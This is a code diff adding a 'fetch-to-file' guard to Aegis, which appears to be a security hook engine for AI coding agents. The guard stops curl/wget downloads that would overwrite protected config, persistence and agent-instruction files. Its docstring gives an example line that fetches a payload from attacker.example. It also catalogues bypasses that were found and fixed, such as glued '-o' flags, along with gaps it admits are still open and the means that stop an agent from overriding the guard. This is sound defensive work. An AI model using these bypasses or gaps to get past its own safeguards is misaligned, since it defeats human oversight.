@@ -4039,6 +4039,343 @@ def rule_ipython_startup_protect(ev: Event, policy=None) -> Optional[Decision]:
     return None
 
 
+# ---- fetch-to-file backstop: closes the "curl -o"/"wget -O" gap every ----------
+# ---- *_protect guard above discloses ------------------------------------------
+
+# Self-protect's own three surfaces (`rule_self_protect`), kept in their own
+# tuple: a hit here is NEVER escapable -- no '# aegis-allow', no
+# AEGIS_ALLOW_* toggle, no policy `allow` regex, checked unconditionally
+# with no `mode` knob -- exactly the posture `rule_self_protect` itself
+# holds for these same files. A fetch-to-file write reaches the identical
+# targets self-protect already treats as non-negotiable; it would be
+# inconsistent to let a human (or, worse, an agent) wave this specific path
+# to them past a gate that closes every other path.
+_FETCH_NEVER_ESCAPABLE = (
+    (patterns.ENFORCEMENT_PATH_RE, "Aegis's own enforcement config (.aegis/, .claude/settings.json)"),
+    (patterns.CONFIG_DIR_RE, "Aegis's own config directory (.aegis/ or .claude/)"),
+    (patterns.AEGIS_SOURCE_RE, "Aegis's own engine source"),
+    (patterns.AEGIS_SKILL_PATH_RE, "Aegis's own shipped skills (.claude/skills/aegis-*)"),
+)
+
+# Every sibling `*_protect` guard's own path surface, reusing each guard's
+# already-defined, already-tested path regex rather than re-deriving it --
+# a hit here is ASK by default (human-only escapable), matching each
+# sibling's own default posture. Deliberately excludes the PATH
+# binary-shadow surface (`rule_path_hijack_protect`): that guard's target
+# is "any trusted command name inside any $PATH bin directory", a
+# name+directory JOINT condition rather than one fixed path regex like
+# every guard below -- folding it in here without real argument parsing
+# risks a worse false-negative/false-positive trade than the disclosed gap
+# is worth, so it stays a known, disclosed gap of this guard instead.
+_FETCH_HUMAN_ESCAPABLE = (
+    (patterns.MCP_CONFIG_PATH_RE, "an MCP server config"),
+    (patterns.CI_WORKFLOW_PATH_RE, "a CI/CD pipeline definition"),
+    (patterns.GIT_HOOKS_PATH_RE, "a git hook"),
+    (patterns.AGENT_DEF_PATH_RE, "an agent/command/output-style definition"),
+    (patterns.AGENT_INSTRUCTIONS_PATH_RE, "CLAUDE.md/AGENTS.md"),
+    (patterns.SHELL_RC_PATH_RE, "a shell startup/profile file"),
+    (patterns.SSH_PERSIST_PATH_RE, "an SSH persistence target"),
+    (patterns.DIRENV_PATH_RE, "a direnv .envrc/direnvrc"),
+    (patterns.PACKAGE_SCRIPTS_PATH_RE, "a package manifest (package.json/composer.json)"),
+    (patterns.REGISTRY_CONFIG_PATH_RE, "a package-registry config"),
+    (patterns.GIT_CONFIG_FILE_PATH_RE, "a git config file"),
+    (patterns.GIT_ATTRS_PATH_RE, "a .gitattributes file"),
+    (patterns.SYSTEMD_UNIT_PATH_RE, "a systemd unit"),
+    (patterns.LAUNCHD_PLIST_PATH_RE, "a launchd plist"),
+    (patterns.LD_PRELOAD_PATH_RE, "the dynamic linker's preload list"),
+    (patterns.LD_SO_CONF_PATH_RE, "the dynamic linker's search-path config"),
+    (patterns.DEVCONTAINER_PATH_RE, "a dev-container config"),
+    (patterns.VSCODE_TASKS_PATH_RE, "a VS Code auto-run task config"),
+    (patterns.VSCODE_SETTINGS_PATH_RE, "VS Code's task auto-run confirmation gate"),
+    (patterns.CLAUDE_LOCAL_SETTINGS_PATH_RE, "Claude Code's local hook config"),
+    (patterns.CONFTEST_PATH_RE, "a pytest conftest.py"),
+    (patterns.PYSITE_CUSTOMIZE_PATH_RE, "a Python interpreter-startup file"),
+    (patterns.PYSITE_PTH_PATH_RE, "a site-packages .pth file"),
+    (patterns.IPYTHON_STARTUP_PATH_RE, "an IPython/Jupyter startup file"),
+)
+
+
+def _fetch_to_file_allowed_by_policy(cfg: dict, text: str) -> bool:
+    for pat in (cfg.get("allow") or []):
+        try:
+            if re.search(str(pat), text, re.IGNORECASE):
+                return True
+        except re.error:
+            continue
+    return False
+
+
+# Most of the ~24 reused target-path regexes in _FETCH_NEVER_ESCAPABLE/
+# _FETCH_HUMAN_ESCAPABLE require a real separator character immediately
+# before the path (`(?:^|[\s'"/\\=])...`) -- the same boundary a normal,
+# SPACED '-o <dest>' already provides. curl/wget's GLUED short-option form
+# (`-o<dest>`, no space -- real, documented syntax, not obscure) instead
+# leaves the path immediately adjacent to the flag's own trailing letter, a
+# WORD character, so that boundary is never satisfied and ~20 of the 24
+# reused regexes silently miss a glued destination even though
+# FETCH_TO_FILE_VERB_RE itself correctly recognizes the verb (only the small
+# minority of target regexes with no such boundary requirement at all --
+# self-protect's own `CONFIG_DIR_RE`/`ENFORCEMENT_PATH_RE`/
+# `AEGIS_SKILL_PATH_RE`, plus `GIT_HOOKS_PATH_RE`/`GIT_CONFIG_FILE_PATH_RE`/
+# `SYSTEMD_UNIT_PATH_RE`/`LAUNCHD_PLIST_PATH_RE`/`PYSITE_PTH_PATH_RE` --
+# happened to still match). QA finding (independent adversarial review,
+# bypass-hunting round): reproduced against `AEGIS_SOURCE_RE` itself, part
+# of the never-escapable tier (`curl -oaegis/rules.py <url>` sailed
+# straight through). Rather than modifying 20 shared, already-tested target
+# regexes (each one also relied on unchanged by its own sibling guard) to
+# accept a boundary they were never designed to need, this normalizes just
+# the SCAN TEXT fed to the target-path loops below: insert a synthetic
+# space after a genuine glued `-o`/`-O`.
+#
+# QA finding (independent adversarial follow-up review, verifying this exact
+# fix): a FIRST version here matched `-o`/`-O` context-free, with no
+# requirement that it actually sit right after ITS OWN tool's name -- so
+# once `FETCH_TO_FILE_VERB_RE` matched anywhere (e.g. one genuine, already-
+# spaced `curl -o /tmp/out.bin ...`), the WHOLE command was rescanned, and
+# an unrelated `-o`/`-O`-shaped substring sitting inert inside a quoted
+# `--data` argument or a shell comment elsewhere in the same command -- not
+# a real flag at all -- got a synthetic space inserted too, newly
+# satisfying a majority-class target regex's boundary requirement it did
+# NOT satisfy before this fix existed (verified: reproduced a fresh false
+# ASK against `AGENT_INSTRUCTIONS_PATH_RE`/`CLAUDE.md` that did NOT occur
+# on the pre-normalization code). Fixed by anchoring each candidate glued
+# occurrence to its OWN tool mention the same way `FETCH_TO_FILE_VERB_RE`
+# itself does (`\bcurl\b[^|;&\n]{0,200}?...`) -- but merely reusing that
+# same `-o(?=\S)`-only shape here still leaked the identical bug: its lazy
+# gap happily backtracks PAST a real, already-spaced `-o` (which never
+# satisfies a bare `(?=\S)` lookahead) to reach a LATER, incidental
+# glued-shaped substring within the same 200-char budget instead. The
+# alternative here captures the actual destination-
+# start token for BOTH the spaced (`\s+\S`) and glued (`\S`) shapes, so the
+# engine commits to and consumes the FIRST real destination token after
+# each tool mention (spaced ones are then a no-op), instead of skipping
+# past it hunting for one that also happens to satisfy a bare `(?=\S)`
+# lookahead. `finditer` then only reaches a SECOND occurrence when a
+# SECOND, genuine tool mention exists later in the command (a real chained
+# `curl ... && curl -o<dest2> ...`), never an incidental one with no tool
+# mention of its own nearby.
+_FETCH_DEST_TOKEN_RE = re.compile(
+    r"\bcurl(?:\.exe)?\b[^|;&\n]{0,200}?(?:^|\s)-(?-i:o)(\s+\S|\S)"
+    r"|\bwget\b[^|;&\n]{0,200}?(?:^|\s)-(?-i:O)(\s+\S|\S)",
+    re.IGNORECASE,
+)
+
+
+def _fetch_normalize_glued_dest(cmd: str) -> str:
+    out = []
+    last = 0
+    for m in _FETCH_DEST_TOKEN_RE.finditer(cmd):
+        group_index = 1 if m.group(1) is not None else 2
+        token = m.group(group_index)
+        if token[0].isspace():
+            continue  # already spaced -- no-op, a real boundary exists
+        start = m.start(group_index)
+        out.append(cmd[last:start])
+        out.append(" ")
+        last = start
+    if not out:
+        return cmd
+    out.append(cmd[last:])
+    return "".join(out)
+
+
+def rule_fetch_to_file_protect(ev: Event, policy=None) -> Optional[Decision]:
+    """Block a shell fetch tool (curl/wget/PowerShell Invoke-WebRequest/
+    Start-BitsTransfer/certutil) writing its response DIRECTLY to a path
+    every guard above already protects.
+
+    THREAT MODEL: every ``*_protect`` guard in this file gates its shell
+    branch on a fixed write-verb set -- a shell redirect, ``cp``/``install``/
+    ``dd``, ``mv``/``rm``, ``sed -i``/``jq``+``sponge``, a forced symlink, an
+    archive/sync tool -- paired with the guard's own protected-path check.
+    None of those verb lists ever included a fetch tool's OWN destination
+    flag: ``curl -o /path/to/target https://attacker.example/payload`` and
+    ``wget -O /path/to/target https://...`` write a file exactly the way
+    ``cp`` does, in one command, with the actual malicious content supplied
+    entirely over the network rather than appearing anywhere in the command
+    text itself -- arguably a STRONGER bypass than the other verbs (nothing
+    in the tool call reveals what gets written, unlike a redirect's inline
+    heredoc or an in-place edit's diff). This is not a theoretical gap:
+    every sibling guard's own docstring in this file discloses it by name,
+    from ``rule_mcp_config_protect`` through ``rule_ipython_startup_
+    protect`` -- fifteen-plus guards sharing one unfixed hole. ``rule_self_
+    protect`` (which carries no docstring of its own) has the identical
+    hole, confirmed by reading its actual code rather than a disclosure:
+    its shell branch's write-verb set (``DELETE_OR_MOVE_VERB_RE`` /
+    ``DESTRUCTIVE_DELETE_RE`` / ``WRITE_REDIRECT_RE`` / ``COPY_WRITE_VERB_RE``
+    / ``INPLACE_WRITE_RE``) has the identical hole for Aegis's OWN
+    policy/config/source -- the one surface this whole file calls "not
+    escapable."
+
+    Rather than adding a sixth write-verb check to each of those guards
+    individually (repeating the same fix N times, with N chances to miss
+    one), this is a single new rule: it re-checks the fetch-to-file verb
+    shape against EVERY already-protected surface in this file at once,
+    reusing each guard's own path regex unchanged.
+
+    Two tiers, matching each target's OWN guard's escapability exactly:
+
+    - ``_FETCH_NEVER_ESCAPABLE`` (self-protect's own surfaces): DENY,
+      unconditional, no ``mode`` knob, no override, no env toggle -- the
+      same posture ``rule_self_protect`` itself holds for these files.
+    - ``_FETCH_HUMAN_ESCAPABLE`` (every sibling ``*_protect`` guard's own
+      path): ASK by default (``policy.fetch_to_file``: ``mode``
+      deny|ask|monitor|off, ``allow`` regexes -- same shape every sibling
+      guard's own config knob uses), escapable by a human only -- a
+      trailing ``# aegis-allow``, or ``AEGIS_ALLOW_FETCH_TO_FILE=1`` set by
+      the orchestrator/human before launch. A spawned agent cannot set its
+      own env for a hook invocation it doesn't control and
+      ``_override_allowed`` already refuses an agent's own ``#
+      aegis-allow``, so neither path is agent-self-escapable, the same
+      invariant every escapable guard in this file holds.
+
+    Config (``policy.fetch_to_file``): ``mode`` (deny|ask|monitor|off,
+    default ask) and ``allow`` govern ONLY the human-escapable tier above --
+    the never-escapable tier has no config surface at all, deliberately,
+    the same way ``rule_self_protect`` itself takes no policy config.
+
+    Honest scope, the same denylist trade-offs every guard in this file
+    discloses: ``FETCH_TO_FILE_VERB_RE`` requires curl's ``-o``/
+    ``--output``/wget's ``-O``/``--output-document`` (or a PowerShell/
+    certutil equivalent) name a literal destination argument in the
+    scanned command -- curl's bare ``-O``/``--remote-name`` and wget's bare
+    ``-P <dir>`` write using a filename taken from the URL itself, putting
+    no literal destination PATH text in the command for the target-path
+    check to match against, so those forms are covered only when combined
+    with an explicit destination the target-path check can still see (see
+    ``FETCH_TO_FILE_VERB_RE``'s own comment in ``patterns.py``); a
+    destination assembled indirectly (shell variable concatenation, a
+    wrapper script) rather than appearing as one contiguous literal defeats
+    every check here, the same "computed indirectly" class every sibling
+    guard already accepts; the PATH binary-shadow surface
+    (``rule_path_hijack_protect``) is not covered at all (see
+    ``_FETCH_HUMAN_ESCAPABLE``'s own comment for why); and, like every
+    other whole-command boolean-AND guard in this file, an unrelated fetch
+    call and an incidental protected-path mention sharing the same command
+    (no real causal link between them) can produce a same-clause false ASK,
+    the accepted trade-off this file's own module docstring and several
+    sibling guards' docstrings already disclose for the identical shape --
+    e.g. a genuine ``wget -O <realfile>`` paired with an UNRELATED ``-o
+    <protected-looking-path>`` (wget's own, distinct log-file flag) in the
+    same command still gates, since the target-path check has no per-flag
+    adjacency awareness, only whole-command presence.
+
+    QA history (two independent adversarial reviews, run in parallel, same
+    convention every guard in this file follows): design/consistency review
+    verified the wiring correct everywhere its siblings are (``_CORE_RULES``/
+    ``BUILTIN_RULES``, ``Policy``, all three ``loader.py`` spots -- round-
+    tripped an actual YAML ``fetch_to_file:`` block through ``load_policy()``
+    into a live ``evaluate()`` decision for both ``mode`` and ``allow``,
+    confirmed via ``aegis validate`` too -- both ``skills.py`` knob lists,
+    the README guard table and Known-gaps paragraph), confirmed the
+    never-escapable tier's four regexes match ``rule_self_protect``'s own
+    checks exactly with no drift, confirmed the full suite green throughout,
+    and recommended leaving the ~14 individual sibling-guard disclosures of
+    this same gap as-is (each is still narrowly true about that guard's OWN
+    write-verb checks; the aggregate picture belongs in README's cross-
+    cutting paragraph, not fourteen edited docstrings). Bypass-hunting found
+    and closed three real, reproduced bugs in ``FETCH_TO_FILE_VERB_RE``
+    before merge -- a glued short-option (`-o.aegis/policy.yaml`, no space)
+    silently bypassing even the never-escapable tier; a blanket
+    ``re.IGNORECASE`` erasing curl's real, case-DISTINCT `-o`/`-O` and
+    wget's `-o`/`-O` semantics, letting curl's deliberately-excluded bare
+    `-O` false-positive and letting wget's unrelated `-o` log flag alone
+    slip past a check meant for `-O`; and the identical unbounded-lazy-gap
+    catastrophic-backtracking shape ``EXFIL_RE``'s own history already
+    fixed once in this file, measured at 18.6s on an 82KB adversarial
+    input, reachable through the real, timeout-free ``evaluate()`` pipeline
+    -- see ``FETCH_TO_FILE_VERB_RE``'s own comment in ``patterns.py`` for
+    all three fixes and the accepted residual gap (curl's clustered
+    short-option form, `-sSLo <target>`) they leave open. Verifying the
+    glued-option fix end-to-end (not just against the one example bypass-
+    hunting tested) surfaced a fourth, broader issue in the same fix round:
+    most of the ~24 reused target regexes require a real separator
+    character immediately before the path (`(?:^|[\\s'"/\\\\=])...`), a
+    boundary the glued flag's own trailing letter never supplies -- so the
+    glued form stayed silently uncaught for the MAJORITY of targets,
+    ``AEGIS_SOURCE_RE`` (never-escapable tier) included, even after the
+    verb-regex fix. Closed with a first version of ``_fetch_normalize_
+    glued_dest`` (below): rather than touching 20 shared, already-tested
+    target regexes, it inserted the same synthetic space a spaced
+    `-o <dest>` already has, on the occurrences a bare, context-free
+    `-o`/`-O` regex found.
+
+    A follow-up, independent adversarial round targeting THAT fix
+    specifically (not re-litigating the earlier findings, verifying them
+    instead) found and closed a fifth real, reproduced bug: the
+    context-free `-o`/`-O` scan had no requirement that the match actually
+    be a real flag of the invocation at all -- so once one genuine,
+    already-spaced `-o /tmp/out.bin` satisfied the initial verb check, the
+    WHOLE command got rescanned, and an unrelated `-o`/`-O`-shaped
+    substring sitting inert inside a quoted `--data` argument or a shell
+    comment elsewhere in the SAME command -- never a real flag -- also got
+    a synthetic space inserted, newly satisfying a majority-class target
+    regex's boundary requirement it did not satisfy before normalization
+    existed at all (reproduced: a fresh false ASK against
+    ``AGENT_INSTRUCTIONS_PATH_RE``/``CLAUDE.md`` with nothing ever written
+    there, confirmed absent on the pre-normalization code by checking out
+    the prior commit directly). A same-shaped repro against a
+    never-escapable-tier target (``CONFIG_DIR_RE``/`.aegis`) turned out to
+    be a RED HERRING on inspection -- that specific regex has no preceding-
+    boundary requirement at all, so it already gated identically before any
+    glued-destination fix existed; only the majority, boundary-requiring
+    class was actually made worse. Closed by anchoring each candidate glued
+    occurrence to its own tool mention, capturing the real destination-
+    start token (spaced or glued) so the matcher commits to and consumes
+    the FIRST genuine destination after each tool mention instead of
+    backtracking past it to reach a later, incidental one -- a naive
+    tool-anchored version using only a bare `(?=\\S)` lookahead (no spaced
+    alternative to consume) was tried first and still leaked the identical
+    bug, since its lazy gap happily skips past a real, already-spaced `-o`
+    (which never satisfies a bare `(?=\\S)`) to reach the incidental one
+    instead. See ``_fetch_normalize_glued_dest``'s own comment for the
+    fix in full."""
+    if not _is_shell(ev):
+        return None
+    cmd = _shell_scan(ev)
+    if not patterns.FETCH_TO_FILE_VERB_RE.search(cmd):
+        return None
+    # Every target-path check below runs against the glue-normalized text
+    # (see `_fetch_normalize_glued_dest`'s own comment) so a glued `-o<dest>`/
+    # `-O<dest>` is seen with the same boundary a spaced form already has —
+    # a no-op when the command has no glued short option at all.
+    target_cmd = _fetch_normalize_glued_dest(cmd)
+
+    for rx, label in _FETCH_NEVER_ESCAPABLE:
+        if rx.search(target_cmd):
+            return Decision(Action.DENY, "fetch-to-file-protect",
+                             f"A fetch tool (curl/wget/...) is writing directly to {label} — "
+                             "the same file(s) self-protection already refuses to let any "
+                             "other write verb touch. Not escapable.")
+
+    cfg = getattr(policy, "fetch_to_file", None) or {}
+    raw_mode = cfg.get("mode", "ask")
+    mode = str(raw_mode).lower()
+    if mode in ("off", "false") or raw_mode is False:
+        return None
+    action = Action.ASK if mode == "ask" else Action.DENY
+
+    for rx, label in _FETCH_HUMAN_ESCAPABLE:
+        if not rx.search(target_cmd):
+            continue
+        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_FETCH_TO_FILE")
+                or _fetch_to_file_allowed_by_policy(cfg, cmd)):
+            return None
+        decision = Decision(action, "fetch-to-file-protect",
+                             f"A fetch tool (curl/wget/...) is writing directly to {label} "
+                             "— this bypasses every write-verb check (redirect/copy/move/"
+                             "in-place-edit/forced-link/archive-sync) the guard for that "
+                             "surface already runs, since a fetch tool's own destination "
+                             "flag was never on any of those lists. A human may append "
+                             "'# aegis-allow', or set AEGIS_ALLOW_FETCH_TO_FILE=1; a "
+                             "spawned agent cannot.")
+        if mode == "monitor":
+            _record_monitor(ev, decision, "fetch-to-file-protect-monitor")
+            return None
+        return decision
+    return None
+
+
 # ---- workspace confinement: opt-in, file-mutation tools ----------------------
 def _within(path: str, root: str) -> bool:
     return path == root or path.startswith(root + os.sep)
@@ -4452,6 +4789,7 @@ _CORE_RULES = (
     rule_conftest_protect,
     rule_pysite_protect,
     rule_ipython_startup_protect,
+    rule_fetch_to_file_protect,
     rule_workspace_confine,
     rule_migration_protection,
     rule_subagent_spawn,
